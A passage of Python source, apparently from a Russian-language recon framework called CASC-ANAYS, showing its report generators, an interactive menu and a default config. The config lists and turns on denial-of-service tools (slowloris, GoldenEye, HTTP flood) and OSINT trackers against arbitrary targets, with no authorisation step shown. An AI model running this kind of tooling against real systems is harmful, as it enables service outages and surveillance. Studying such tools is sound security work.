        if "subdomains" in mods:
            html.append(self._html_subdomains(mods["subdomains"]))

        # Уязвимости
        if "vuln" in mods:
            html.append(self._html_vulns(mods["vuln"]))

        # Стресс-тесты
        if "stress" in mods:
            html.append(self._html_stress(mods["stress"]))

        html.append("</div>")
        return "".join(html)

    # ---------- Секция: Порты ----------
    def _html_ports(self, ports_data: Dict[str, Any]) -> str:
        ports = ports_data.get("ports", {}) or {}
        open_count = ports_data.get("open_count", 0)
        scanned = ports_data.get("scanned", 0)

        html = [f'<h2>🔌 Открытые порты <span class="tag">{open_count}/{scanned}</span></h2>']

        if not ports:
            html.append('<div class="empty">Нет открытых портов</div>')
            return "".join(html)

        html.append('<table><tr><th>Порт</th><th>Сервис</th><th>Риск</th><th>Баннер</th></tr>')
        for port, info in sorted(ports.items(), key=lambda x: int(x[0])):
            if isinstance(info, dict):
                service = info.get("service", "unknown")
                risk = info.get("risk", "normal")
                banner = info.get("banner") or ""
            else:
                service = str(info)
                risk = "normal"
                banner = ""

            risk_html = f'<span class="port-risk">{risk}</span>' if risk == "high" else risk
            banner_html = self._esc(Utils.truncate(banner, 80)) if banner else ""

            html.append(
                f'<tr>'
                f'<td class="port-open">{port}</td>'
                f'<td>{self._esc(service)}</td>'
                f'<td>{risk_html}</td>'
                f'<td>{banner_html}</td>'
                f'</tr>'
            )
        html.append("</table>")
        return "".join(html)

    # ---------- Секция: HTTP ----------
    def _html_http(self, http: Dict[str, Any]) -> str:
        html = ['<h2>🌐 HTTP-анализ</h2>']

        server = http.get("server") or "N/A"
        status = http.get("status_code") or "N/A"
        title = http.get("title") or "N/A"
        waf = http.get("waf") or "Нет"
        scheme = http.get("scheme") or "N/A"

        html.append('<div class="kv-grid">')
        html.append(f'<div class="kv"><span class="k">Схема:</span> <span class="v">{scheme}</span></div>')
        html.append(f'<div class="kv"><span class="k">Server:</span> <span class="v">{self._esc(server)}</span></div>')
        html.append(f'<div class="kv"><span class="k">Status:</span> <span class="v">{status}</span></div>')
        html.append(f'<div class="kv"><span class="k">Title:</span> <span class="v">{self._esc(title)}</span></div>')
        html.append(f'<div class="kv"><span class="k">WAF:</span> <span class="v">{self._esc(waf)}</span></div>')
        html.append("</div>")

        # Технологии
        techs = http.get("technologies", [])
        if techs:
            html.append('<h3>Технологии</h3><div>')
            for t in techs:
                html.append(f'<span class="tag">{self._esc(t)}</span>')
            html.append("</div>")

        # Security headers
        sec = http.get("security_headers", {})
        if sec:
            html.append('<h3>Security Headers</h3>')
            html.append('<table><tr><th>Заголовок</th><th>Значение</th></tr>')
            for k, v in sec.items():
                html.append(f'<tr><td>{self._esc(k)}</td><td>{self._esc(Utils.truncate(v, 100))}</td></tr>')
            html.append("</table>")

        # SSL
        ssl_info = http.get("ssl")
        if ssl_info:
            html.append('<h3>🔒 SSL/TLS</h3>')
            valid = ssl_info.get("valid")
            valid_html = '<span class="ok">✓ Валиден</span>' if valid else '<span class="bad">✗ Невалиден</span>'
            days = ssl_info.get("days_left")
            days_html = f'<span class="{"ok" if (days or 0) > 30 else "warn"}">{days} дн.</span>'

            html.append('<div class="kv-grid">')
            html.append(f'<div class="kv"><span class="k">Статус:</span> <span class="v">{valid_html}</span></div>')
            html.append(f'<div class="kv"><span class="k">Issuer:</span> <span class="v">{self._esc(ssl_info.get("issuer") or "N/A")}</span></div>')
            html.append(f'<div class="kv"><span class="k">Expires:</span> <span class="v">{self._esc(ssl_info.get("expires") or "N/A")}</span></div>')
            html.append(f'<div class="kv"><span class="k">Days left:</span> <span class="v">{days_html}</span></div>')
            html.append(f'<div class="kv"><span class="k">Version:</span> <span class="v">{self._esc(ssl_info.get("version") or "N/A")}</span></div>')
            html.append("</div>")

            sans = ssl_info.get("san", [])
            if sans:
                html.append('<h3>SAN</h3><div>')
                for s in sans[:20]:
                    html.append(f'<span class="tag">{self._esc(s)}</span>')
                html.append("</div>")

        return "".join(html)

    # ---------- Секция: DNS ----------
    def _html_dns(self, dns: Dict[str, Any]) -> str:
        records = dns.get("records", {})
        html = [f'<h2>🌍 DNS-записи <span class="tag">{len(records)}</span></h2>']

        if not records:
            html.append('<div class="empty">Нет DNS-записей</div>')
            return "".join(html)

        html.append('<table><tr><th>Тип</th><th>Значение</th></tr>')
        for rtype, values in records.items():
            if not values:
                continue
            for v in values:
                html.append(f'<tr><td>{self._esc(rtype)}</td><td>{self._esc(Utils.truncate(str(v), 150))}</td></tr>')
        html.append("</table>")

        # Флаги
        flags = []
        if dns.get("has_mx"): flags.append("MX")
        if dns.get("has_spf"): flags.append("SPF")
        if dns.get("has_dmarc"): flags.append("DMARC")
        if flags:
            html.append('<div>')
            for f in flags:
                html.append(f'<span class="tag ok">✓ {f}</span>')
            html.append("</div>")

        return "".join(html)

    # ---------- Секция: OSINT ----------
    def _html_osint(self, osint: Dict[str, Any]) -> str:
        whois = osint.get("whois", {})
        if not whois:
            return ""

        html = ['<h2>🕵 OSINT / WHOIS</h2>']
        html.append('<div class="kv-grid">')

        fields = [
            ("Registrar", "registrar"),
            ("Создан", "creation_date"),
            ("Истекает", "expiration_date"),
            ("Обновлён", "updated_date"),
            ("Организация", "org"),
            ("Страна", "country"),
        ]
        for label, key in fields:
            val = whois.get(key)
            if val:
                html.append(f'<div class="kv"><span class="k">{label}:</span> <span class="v">{self._esc(Utils.truncate(str(val), 100))}</span></div>')

        html.append("</div>")

        ns = whois.get("name_servers", [])
        if ns:
            html.append('<h3>Name Servers</h3><div>')
            for n in ns[:10]:
                html.append(f'<span class="tag">{self._esc(n)}</span>')
            html.append("</div>")

        emails = whois.get("emails", [])
        if emails:
            html.append('<h3>Emails</h3><div>')
            for e in emails[:10]:
                html.append(f'<span class="tag">{self._esc(e)}</span>')
            html.append("</div>")

        return "".join(html)

    # ---------- Секция: Поддомены ----------
    def _html_subdomains(self, subs: Dict[str, Any]) -> str:
        subdomains = subs.get("subdomains", [])
        sources = subs.get("sources", [])
        total = subs.get("total", 0)

        html = [f'<h2>🌐 Поддомены <span class="tag">{total}</span></h2>']

        if sources:
            html.append('<div>')
            for s in sources:
                html.append(f'<span class="tag">{self._esc(s)}</span>')
            html.append("</div>")

        if not subdomains:
            html.append('<div class="empty">Поддомены не найдены</div>')
            return "".join(html)

        html.append('<div class="subdomain-list" style="margin-top:15px">')
        for s in subdomains[:200]:
            html.append(f'<span class="subdomain">{self._esc(s)}</span>')
        html.append("</div>")

        if len(subdomains) > 200:
            html.append(f'<div class="empty">... и ещё {len(subdomains) - 200}</div>')

        return "".join(html)

    # ---------- Секция: Уязвимости ----------
    def _html_vulns(self, vuln: Dict[str, Any]) -> str:
        total = 0
        for lst in vuln.values():
            if isinstance(lst, list):
                total += len(lst)

        html = [f'<h2>⚠️ Уязвимости <span class="tag">{total}</span></h2>']

        if total == 0:
            html.append('<div class="empty ok">✓ Уязвимостей не найдено</div>')
            return "".join(html)

        type_labels = {
            "cve": "CVE",
            "nikto": "Nikto",
            "sqli": "SQL Injection",
            "xss": "XSS",
            "lfi": "LFI",
        }

        for vtype, lst in vuln.items():
            if not isinstance(lst, list) or not lst:
                continue

            label = type_labels.get(vtype, vtype.upper())
            html.append(f'<h3 class="collapsible open">{label} ({len(lst)})</h3>')
            html.append('<div class="collapsible-content open">')

            for v in lst:
                sev = (v.get("severity") or "info").lower()
                name = v.get("name", "Уязвимость")
                desc = v.get("description", "")
                evidence = v.get("evidence", "")
                url = v.get("url", "")
                param = v.get("param", "")
                cve = v.get("cve", "")

                html.append(f'<div class="vuln-item {sev}">')
                html.append('<div class="name">')
                html.append(f'<span class="severity {sev}">{sev}</span>')
                html.append(f'<span>{self._esc(name)}</span>')
                if cve:
                    html.append(f'<span class="tag">{self._esc(cve)}</span>')
                html.append("</div>")

                if desc:
                    html.append(f'<div class="desc">{self._esc(desc)}</div>')

                if url:
                    html.append(f'<div class="evidence">URL: {self._esc(url)}</div>')
                if param:
                    html.append(f'<div class="evidence">Параметр: {self._esc(param)}</div>')
                if evidence:
                    html.append(f'<div class="evidence">{self._esc(evidence)}</div>')

                html.append("</div>")

            html.append("</div>")

        return "".join(html)

    # ---------- Секция: Стресс ----------
    def _html_stress(self, stress: Dict[str, Any]) -> str:
        html = ['<h2>💥 Стресс-тесты</h2>']

        sl = stress.get("slowloris", {})
        if sl:
            html.append('<h3>Slowloris</h3>')
            html.append('<div class="kv-grid">')
            html.append(f'<div class="kv"><span class="k">Соединений:</span> <span class="v">{sl.get("connections", 0)}</span></div>')
            html.append(f'<div class="kv"><span class="k">Ошибок:</span> <span class="v">{sl.get("errors", 0)}</span></div>')
            html.append(f'<div class="kv"><span class="k">Успех:</span> <span class="v">{sl.get("success")}</span></div>')
            html.append("</div>")

        hf = stress.get("http_flood", {})
        if hf:
            html.append('<h3>HTTP-флуд</h3>')
            html.append('<div class="kv-grid">')
            html.append(f'<div class="kv"><span class="k">Запросов:</span> <span class="v">{hf.get("requests", 0)}</span></div>')
            html.append(f'<div class="kv"><span class="k">Ошибок:</span> <span class="v">{hf.get("errors", 0)}</span></div>')
            html.append(f'<div class="kv"><span class="k">Время:</span> <span class="v">{Utils.format_duration(hf.get("duration", 0))}</span></div>')
            html.append("</div>")

        ge = stress.get("goldeneye", {})
        if ge:
            html.append('<h3>GoldenEye</h3>')
            html.append(f'<div class="kv"><span class="k">Успех:</span> <span class="v">{ge.get("success")}</span></div>')

        return "".join(html)

    # ---------- Escape ----------
    def _esc(self, s: Any) -> str:
        if s is None:
            return ""
        s = str(s)
        return (s.replace("&", "&amp;")
                 .replace("<", "&lt;")
                 .replace(">", "&gt;")
                 .replace('"', "&quot;"))


# ==============================================================================
# JSON REPORT
# ==============================================================================
class JSONReportGenerator:
    """Генерирует JSON-отчёт"""

    def __init__(self, indent: int = 4):
        self.indent = indent

    def generate(self, results: Dict[str, Any]) -> str:
        """Возвращает JSON-строку"""
        payload = {
            "meta": {
                "generator": "CASC-ANAYS",
                "version": VERSION,
                "timestamp": datetime.now().isoformat(),
                "author": AUTHOR,
                "github": GITHUB_URL,
            },
            "results": results,
        }
        return json.dumps(payload, indent=self.indent, ensure_ascii=False, default=str)


# ==============================================================================
# CSV REPORT
# ==============================================================================
class CSVReportGenerator:
    """Генерирует CSV-отчёт (уязвимости)"""

    def generate(self, results: Dict[str, Any]) -> str:
        """Возвращает CSV-строку"""
        buf = io.StringIO()
        writer = csv.writer(buf, quoting=csv.QUOTE_MINIMAL)

        # Заголовки
        writer.writerow([
            "Target", "IP", "Type", "Name", "Severity",
            "Description", "URL", "Param", "CVE", "Evidence"
        ])

        for target_name, data in results.items():
            hostname = data.get("hostname", target_name)
            ip = data.get("ip", "")
            vuln = data.get("modules", {}).get("vuln", {})

            if not isinstance(vuln, dict):
                continue

            for vtype, lst in vuln.items():
                if not isinstance(lst, list):
                    continue
                for v in lst:
                    writer.writerow([
                        hostname,
                        ip,
                        vtype,
                        v.get("name", ""),
                        v.get("severity", ""),
                        Utils.truncate(v.get("description", ""), 300),
                        v.get("url", ""),
                        v.get("param", ""),
                        v.get("cve", ""),
                        Utils.truncate(v.get("evidence", ""), 200),
                    ])

        return buf.getvalue()


# ==============================================================================
# MARKDOWN REPORT
# ==============================================================================
class MarkdownReportGenerator:
    """Генерирует Markdown-отчёт"""

    def generate(self, results: Dict[str, Any]) -> str:
        lines = [
            "# CASC-ANAYS — Отчёт",
            "",
            f"**Дата:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ",
            f"**Версия:** {VERSION}  ",
            f"**Автор:** {AUTHOR}  ",
            "",
            "---",
            "",
        ]

        # Сводка
        total_vulns = 0
        for data in results.values():
            vuln = data.get("modules", {}).get("vuln", {})
            if isinstance(vuln, dict):
                for lst in vuln.values():
                    if isinstance(lst, list):
                        total_vulns += len(lst)

        lines.append(f"## Сводка")
        lines.append("")
        lines.append(f"- **Целей:** {len(results)}")
        lines.append(f"- **Уязвимостей:** {total_vulns}")
        lines.append("")

        # По каждой цели
        for target_name, data in results.items():
            hostname = data.get("hostname", target_name)
            ip = data.get("ip") or "N/A"
            status = data.get("status", "unknown")

            lines.append("---")
            lines.append("")
            lines.append(f"## {hostname}")
            lines.append("")
            lines.append(f"- **IP:** {ip}")
            lines.append(f"- **Статус:** {status}")
            lines.append("")

            mods = data.get("modules", {})

            # Порты
            ports = mods.get("ports", {}).get("ports", {})
            if ports:
                lines.append("### Порты")
                lines.append("")
                lines.append("| Порт | Сервис |")
                lines.append("|------|--------|")
                for p, info in sorted(ports.items(), key=lambda x: int(x[0])):
                    s = info.get("service", "unknown") if isinstance(info, dict) else str(info)
                    lines.append(f"| {p} | {s} |")
                lines.append("")

            # HTTP
            http = mods.get("http", {})
            if http:
                lines.append("### HTTP")
                lines.append("")
                lines.append(f"- **Server:** {http.get('server') or 'N/A'}")
                lines.append(f"- **Status:** {http.get('status_code') or 'N/A'}")
                lines.append(f"- **WAF:** {http.get('waf') or 'Нет'}")
                lines.append("")

            # Поддомены
            subs = mods.get("subdomains", {}).get("subdomains", [])
            if subs:
                lines.append(f"### Поддомены ({len(subs)})")
                lines.append("")
                for s in subs[:50]:
                    lines.append(f"- {s}")
                if len(subs) > 50:
                    lines.append(f"- ... и ещё {len(subs) - 50}")
                lines.append("")

            # Уязвимости
            vuln = mods.get("vuln", {})
            if vuln and any(v for v in vuln.values() if v):
                lines.append("### Уязвимости")
                lines.append("")
                for vtype, lst in vuln.items():
                    if not lst:
                        continue
                    lines.append(f"#### {vtype.upper()}")
                    lines.append("")
                    for v in lst:
                        sev = v.get("severity", "info")
                        name = v.get("name", "Vuln")
                        desc = v.get("description", "")
                        lines.append(f"- **[{sev.upper()}]** {name} — {desc}")
                    lines.append("")

        lines.append("---")
        lines.append("")
        lines.append(f"_CASC-ANAYS v{VERSION} — {GITHUB_URL}_")

        return "\n".join(lines)


# ==============================================================================
# ИНТЕРАКТИВНЫЙ РЕЖИМ
# ==============================================================================
class InteractiveMode:
    """
    Интерактивный режим CASC-ANAYS
    Меню с 12 пунктами
    """

    def __init__(self, app: "CascAnalys"):
        self.app = app
        self.running = True

    # ---------- Главное меню ----------
    def run(self):
        while self.running:
            if is_shutdown_requested():
                break
            self._print_menu()
            try:
                choice = input(Colors.light_purple("  > ")).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            self._handle(choice)

    def _print_menu(self):
        print()
        print(Colors.purple("  " + "=" * 60))
        print(Colors.bold_purple("  CASC-ANAYS — ИНТЕРАКТИВНЫЙ РЕЖИМ"))
        print(Colors.purple("  " + "=" * 60))
        print(f"  {Colors.cyan('[1]')} Анализ цели (полный)")
        print(f"  {Colors.cyan('[2]')} Умный анализ")
        print(f"  {Colors.cyan('[3]')} Управление целями")
        print(f"  {Colors.cyan('[4]')} Инициализация репозиториев")
        print(f"  {Colors.cyan('[5]')} Список целей")
        print(f"  {Colors.cyan('[6]')} Список репозиториев")
        print(f"  {Colors.cyan('[7]')} Показать статистику")
        print(f"  {Colors.cyan('[8]')} Генерировать HTML-отчёт")
        print(f"  {Colors.cyan('[9]')} Генерировать JSON-отчёт")
        print(f"  {Colors.cyan('[10]')} Экспорт результатов")
        print(f"  {Colors.cyan('[11]')} Настройки")
        print(f"  {Colors.red('[0]')} Выход")
        print(Colors.purple("  " + "=" * 60))

    # ---------- Обработка выбора ----------
    def _handle(self, choice: str):
        handlers = {
            "1": self._analyze,
            "2": self._smart_analyze,
            "3": self._manage_targets,
            "4": self._init_repos,
            "5": self._list_targets,
            "6": self._list_repos,
            "7": self._stats,
            "8": self._html_report,
            "9": self._json_report,
            "10": self._export_results,
            "11": self._settings,
            "0": self._exit,
        }

        handler = handlers.get(choice)
        if handler:
            try:
                handler()
            except KeyboardInterrupt:
                print(Colors.yellow("\n  Прервано"))
            except Exception as e:
                print(Colors.red(f"\n  Ошибка: {e}"))
        else:
            print(Colors.yellow("  Неизвестная команда"))

    # ---------- [1] Полный анализ ----------
    def _analyze(self):
        target = input(Colors.cyan("  Цель (домен/IP): ")).strip()
        if not target:
            return

        modules_str = input(
            Colors.dim("  Модули через запятую (Enter — все): ")
        ).strip()
        modules = [m.strip() for m in modules_str.split(',')] if modules_str else None

        if self.app.add_target(target):
            target_obj = self.app.targets[-1]
            result = self.app.analyze_target(target_obj, modules=modules)
            self.app.results[target_obj.original] = result
            print(Colors.green(f"\n  ✓ Анализ завершён"))
        else:
            # Возможно, цель уже есть
            existing = self.app.get_target_by_name(target)
            if existing:
                print(Colors.yellow("  Цель уже есть, запускаю анализ"))
                result = self.app.analyze_target(existing, modules=modules)
                self.app.results[existing.original] = result

    # ---------- [2] Умный анализ ----------
    def _smart_analyze(self):
        target = input(Colors.cyan("  Цель (домен/IP): ")).strip()
        if not target:
            return

        if self.app.add_target(target):
            target_obj = self.app.targets[-1]
        else:
            target_obj = self.app.get_target_by_name(target)
            if not target_obj:
                print(Colors.red("  Не удалось добавить цель"))
                return

        result = self.app.smart_analyze(target_obj)
        self.app.results[target_obj.original] = result
        print(Colors.green(f"\n  ✓ Умный анализ завершён"))

    # ---------- [3] Управление целями ----------
    def _manage_targets(self):
        print()
        print(f"  {Colors.cyan('[1]')} Добавить цель")
        print(f"  {Colors.cyan('[2]')} Удалить цель")
        print(f"  {Colors.cyan('[3]')} Показать цели")
        print(f"  {Colors.cyan('[4]')} Очистить всё")
        print(f"  {Colors.cyan('[0]')} Назад")

        c = input(Colors.light_purple("  > ")).strip()

        if c == "1":
            t = input(Colors.cyan("  Цель: ")).strip()
            if t:
                self.app.add_target(t)
        elif c == "2":
            t = input(Colors.cyan("  Цель: ")).strip()
            if t:
                self.app.remove_target(t)
        elif c == "3":
            self._list_targets()
        elif c == "4":
            confirm = input(Colors.yellow("  Удалить все цели? (y/N): ")).strip().lower()
            if confirm == 'y':
                self.app.clear_targets()
                print(Colors.green("  ✓ Очищено"))

    # ---------- [4] Репозитории ----------
    def _init_repos(self):
        print()
        print(f"  {Colors.cyan('[1]')} Инициализировать (без тяжёлых)")
        print(f"  {Colors.cyan('[2]')} Инициализировать (все)")
        print(f"  {Colors.cyan('[3]')} Параллельно")
        print(f"  {Colors.cyan('[4]')} С зависимостями")
        print(f"  {Colors.cyan('[0]')} Назад")

        c = input(Colors.light_purple("  > ")).strip()

        if c == "1":
            self.app.init_repos(skip_heavy=True)
        elif c == "2":
            self.app.init_repos(skip_heavy=False)
        elif c == "3":
            self.app.init_repos(parallel=True)
        elif c == "4":
            self.app.init_repos(install_deps=True)

    # ---------- [5] Список целей ----------
    def _list_targets(self):
        targets = self.app.list_targets()
        if not targets:
            print(Colors.yellow("\n  Нет целей"))
            return
        print(Colors.bold_purple(f"\n  Целей: {len(targets)}"))
        for i, t in enumerate(targets, 1):
            print(f"    {Colors.cyan(str(i) + '.')} {t}")

    # ---------- [6] Список репозиториев ----------
    def _list_repos(self):
        print()
        self.app.repo_manager.print_list(group_by_category=True)

    # ---------- [7] Статистика ----------
    def _stats(self):
        if not self.app.results:
            print(Colors.yellow("\n  Нет результатов"))
            return

        stats = self.app.get_stats()

        print(Colors.bold_purple("\n  СТАТИСТИКА"))
        print(Colors.dim("  " + "-" * 40))
        print(f"  Целей:        {stats['targets']}")
        print(f"  Портов:       {stats['total_ports']}")
        print(f"  Поддоменов:   {stats['total_subdomains']}")
        print(f"  Уязвимостей:  {stats['total_vulns']}")
        print(Colors.dim("  " + "-" * 40))
        sev = stats["vulns_by_severity"]
        print(f"  Critical:  {Colors.red(str(sev['critical']))}")
        print(f"  High:      {Colors.red(str(sev['high']))}")
        print(f"  Medium:    {Colors.yellow(str(sev['medium']))}")
        print(f"  Low:       {Colors.green(str(sev['low']))}")
        print(f"  Info:      {Colors.cyan(str(sev['info']))}")
        print(Colors.dim("  " + "-" * 40))

    # ---------- [8] HTML-отчёт ----------
    def _html_report(self):
        if not self.app.results:
            print(Colors.yellow("\n  Нет результатов"))
            return
        path = self.app.generate_report(self.app.results)
        print(Colors.green(f"\n  ✓ HTML: {path}"))

    # ---------- [9] JSON-отчёт ----------
    def _json_report(self):
        if not self.app.results:
            print(Colors.yellow("\n  Нет результатов"))
            return
        path = self.app.generate_json_report(self.app.results)
        print(Colors.green(f"\n  ✓ JSON: {path}"))

    # ---------- [10] Экспорт ----------
    def _export_results(self):
        if not self.app.results:
            print(Colors.yellow("\n  Нет результатов"))
            return
        path = self.app.export_results()
        print(Colors.green(f"\n  ✓ Экспортировано: {path}"))

    # ---------- [11] Настройки ----------
    def _settings(self):
        print()
        print(f"  {Colors.cyan('[1]')} Уровень логов")
        print(f"  {Colors.cyan('[2]')} Таймаут")
        print(f"  {Colors.cyan('[3]')} Потоки")
        print(f"  {Colors.cyan('[0]')} Назад")

        c = input(Colors.light_purple("  > ")).strip()

        if c == "1":
            lvl = input(Colors.cyan("  Уровень (DEBUG/INFO/WARNING/ERROR): ")).strip().upper()
            if lvl in ("DEBUG", "INFO", "WARNING", "ERROR"):
                self.app.set_log_level(lvl)
                print(Colors.green(f"  ✓ Уровень: {lvl}"))
        elif c == "2":
            try:
                v = int(input(Colors.cyan("  Таймаут (сек): ")).strip())
                self.app.config.set('settings.timeout', v)
                print(Colors.green(f"  ✓ Таймаут: {v}"))
            except ValueError:
                pass
        elif c == "3":
            try:
                v = int(input(Colors.cyan("  Потоки: ")).strip())
                self.app.config.set('settings.threads', v)
                print(Colors.green(f"  ✓ Потоки: {v}"))
            except ValueError:
                pass

    # ---------- [0] Выход ----------
    def _exit(self):
        print(Colors.purple("\n  Выход..."))
        self.running = False


# ==============================================================================
# MONKEY-PATCH: ПРИВЯЗКА МЕТОДОВ К CascAnalys
# ==============================================================================
def _bind_report_methods():
    """
    Привязывает методы генерации отчётов к классу CascAnalys
    (part5 объявляет обёртки _generate_reports, здесь — реальные методы)
    """

    def generate_report(self, results: Dict[str, Any],
                        output_file: Optional[str] = None) -> str:
        """Генерирует HTML-отчёт"""
        if output_file is None:
            out_dir = self.config.get_output_dir()
            out_dir.mkdir(parents=True, exist_ok=True)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = out_dir / f"casc_anays_{ts}.html"

        out = Path(output_file)
        out.parent.mkdir(parents=True, exist_ok=True)

        gen = HTMLReportGenerator(version=VERSION, author=AUTHOR, github=GITHUB_URL)
        html = gen.generate(results)
        out.write_text(html, encoding='utf-8')
        return str(out)

    def generate_json_report(self, results: Dict[str, Any],
                             output_file: Optional[str] = None) -> str:
        """Генерирует JSON-отчёт"""
        if output_file is None:
            out_dir = self.config.get_output_dir()
            out_dir.mkdir(parents=True, exist_ok=True)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = out_dir / f"casc_anays_{ts}.json"

        out = Path(output_file)
        out.parent.mkdir(parents=True, exist_ok=True)

        gen = JSONReportGenerator()
        out.write_text(gen.generate(results), encoding='utf-8')
        return str(out)

    def generate_csv_report(self, results: Dict[str, Any],
                            output_file: Optional[str] = None) -> str:
        """Генерирует CSV-отчёт"""
        if output_file is None:
            out_dir = self.config.get_output_dir()
            out_dir.mkdir(parents=True, exist_ok=True)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = out_dir / f"casc_anays_{ts}.csv"

        out = Path(output_file)
        out.parent.mkdir(parents=True, exist_ok=True)

        gen = CSVReportGenerator()
        out.write_text(gen.generate(results), encoding='utf-8')
        return str(out)

    def generate_markdown_report(self, results: Dict[str, Any],
                                  output_file: Optional[str] = None) -> str:
        """Генерирует Markdown-отчёт"""
        if output_file is None:
            out_dir = self.config.get_output_dir()
            out_dir.mkdir(parents=True, exist_ok=True)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = out_dir / f"casc_anays_{ts}.md"

        out = Path(output_file)
        out.parent.mkdir(parents=True, exist_ok=True)

        gen = MarkdownReportGenerator()
        out.write_text(gen.generate(results), encoding='utf-8')
        return str(out)

    # Привязываем
    CascAnalys.generate_report = generate_report
    CascAnalys.generate_json_report = generate_json_report
    CascAnalys.generate_csv_report = generate_csv_report
    CascAnalys.generate_markdown_report = generate_markdown_report


# Привязываем сразу при импорте
try:
    _bind_report_methods()
except NameError:
    # CascAnalys ещё не определён — привяжем позже
    pass


# ==============================================================================
# КОНЕЦ PART 6
# ==============================================================================
# В следующей части (part7_cli.py):
#   - build_cli()              — полный argparse
#   - print_help_extended()    — расширенная справка
#   - DEFAULT_CONFIG_JSON      — конфиг по умолчанию
#   - create_default_config()  — создание config.json
#   - run_self_tests()         — самотестирование
#   - main()                   — точка входа
#   - if __name__ == "__main__"
# ==============================================================================# ==============================================================================
# PART 7 — ФИНАЛЬНЫЙ CLI, ТЕСТЫ, ТОЧКА ВХОДА
# CASC-ANAYS v4.0 — Финальная сборка
# ==============================================================================
# Требует: part1_core.py … part6_reports.py
# ==============================================================================

import os
import sys
import json
import time
import argparse
import traceback
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any


# ==============================================================================
# КОНФИГУРАЦИЯ ПО УМОЛЧАНИЮ (config.json)
# ==============================================================================
DEFAULT_CONFIG_JSON: Dict[str, Any] = {
    "targets": [],
    "modules": {
        "osint": True,
        "subdomain": True,
        "vuln": True,
        "stress": True,
        "port_scan": True
    },
    "settings": {
        "threads": 10,
        "timeout": 10,
        "output_dir": "reports",
        "log_level": "INFO",
        "log_file": None,
        "use_proxy": False,
        "proxy_file": "proxies.txt",
        "user_agent": None,
        "follow_redirects": True,
        "verify_ssl": False,
        "max_subdomains": 500,
        "parallel_repos": False,
        "subdomain_bruteforce": False
    },
    "repos": {
        # OSINT (12)
        "sherlock": {"url": "https://github.com/sherlock-project/sherlock.git", "branch": "master"},
        "whatsmyname": {"url": "https://github.com/WebBreacher/WhatsMyName.git", "branch": "main"},
        "maigret": {"url": "https://github.com/soxoj/maigret.git", "branch": "main"},
        "theharvester": {"url": "https://github.com/laramies/theHarvester.git", "branch": "master"},
        "spiderfoot": {"url": "https://github.com/smicallef/spiderfoot.git", "branch": "master"},
        "ghunt": {"url": "https://github.com/mxrch/GHunt.git", "branch": "main"},
        "photon": {"url": "https://github.com/s0md3v/Photon.git", "branch": "master"},
        "osintgram": {"url": "https://github.com/Datalux/Osintgram.git", "branch": "main"},
        "h8mail": {"url": "https://github.com/khast3x/h8mail.git", "branch": "master"},
        "holehe": {"url": "https://github.com/megadose/holehe.git", "branch": "master"},
        "trape": {"url": "https://github.com/jofpin/trape.git", "branch": "master"},
        "torbot": {"url": "https://github.com/DedSecInside/TorBot.git", "branch": "main"},
        # Поддомены (9)
        "sublist3r": {"url": "https://github.com/aboul3la/Sublist3r.git", "branch": "master"},
        "amass": {"url": "https://github.com/owasp-amass/amass.git", "branch": "master"},
        "subfinder": {"url": "https://github.com/projectdiscovery/subfinder.git", "branch": "main"},
        "findomain": {"url": "https://github.com/Findomain/Findomain.git", "branch": "master"},
        "subcat": {"url": "https://github.com/duty1g/subcat.git", "branch": "main"},
        "subdomain-enumerator": {"url": "https://github.com/ryuukhagetsu/subdomain-enumerator.git", "branch": "main"},
        "subdomain-enum-tool": {"url": "https://github.com/Sergios9494/subdomain-enum-tool.git", "branch": "main"},
        "dnsrecon": {"url": "https://github.com/darkoperator/dnsrecon.git", "branch": "master"},
        "certinfo": {"url": "https://github.com/rix4uni/certinfo.git", "branch": "main"},
        # Уязвимости (12)
        "nikto": {"url": "https://github.com/sullo/nikto.git", "branch": "master"},
        "nuclei": {"url": "https://github.com/projectdiscovery/nuclei.git", "branch": "main"},
        "web-vuln-scanner": {"url": "https://github.com/HoangZuzi-14/Web-Vulnerability-Scanner.git", "branch": "main"},
        "wpscan": {"url": "https://github.com/wpscanteam/wpscan.git", "branch": "master"},
        "joomscan": {"url": "https://github.com/rezasp/joomscan.git", "branch": "master"},
        "cmsmap": {"url": "https://github.com/dionach/CMSmap.git", "branch": "master"},
        "cmseek": {"url": "https://github.com/Tuhinshubhra/CMSeeK.git", "branch": "master"},
        "cms-vuln-scanner": {"url": "https://github.com/Lordozer/cms-scanner.git", "branch": "main"},
        "jaeles": {"url": "https://github.com/jaeles-project/jaeles.git", "branch": "main"},
        "gitleaks": {"url": "https://github.com/gitleaks/gitleaks.git", "branch": "master"},
        "trufflehog": {"url": "https://github.com/trufflesecurity/trufflehog.git", "branch": "main"},
        "wordpress-plugins": {"url": "https://github.com/rix4uni/wordpress-plugins.git", "branch": "main"},
        # Стресс (4)
        "floodles": {"url": "https://github.com/franckferman/Floodles.git", "branch": "main"},
        "ddos-attack": {"url": "https://github.com/karthik558/ddos-attack.git", "branch": "main"},
        "slowloris": {"url": "https://github.com/gkbrk/slowloris.git", "branch": "master"},
        "goldeneye": {"url": "https://github.com/jseidl/GoldenEye.git", "branch": "master"},
        # Словари (2)
        "seclists": {"url": "https://github.com/danielmiessler/SecLists.git", "branch": "master"},
        "fuzzdb": {"url": "https://github.com/fuzzdb-project/fuzzdb.git", "branch": "master"},
        # Вспомогательные (1)
        "behindthecdn": {"url": "https://github.com/Neved4/behindTheCDN.git", "branch": "main"}
    }
}


def create_default_config(path: str = "config.json", force: bool = False) -> bool:
    """
    Создаёт config.json, если его нет
    force=True — перезаписать
    """
    p = Path(path)
    if p.exists() and not force:
        return False

    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        with open(p, 'w', encoding='utf-8') as f:
            json.dump(DEFAULT_CONFIG_JSON, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        print(Colors.red(f"Ошибка создания конфига: {e}"))
        return False


# ==============================================================================
# CLI-ПАРСЕР
# ==============================================================================
def build_cli() -> argparse.ArgumentParser:
    """
    Строит полный CLI CASC-ANAYS
    Все аргументы сгруппированы по логическим блокам
    """
    parser = argparse.ArgumentParser(
        prog="casc-anays",
        description=f"{Colors.purple('CASC-ANAYS')} — Глобальный аналитический комплекс",
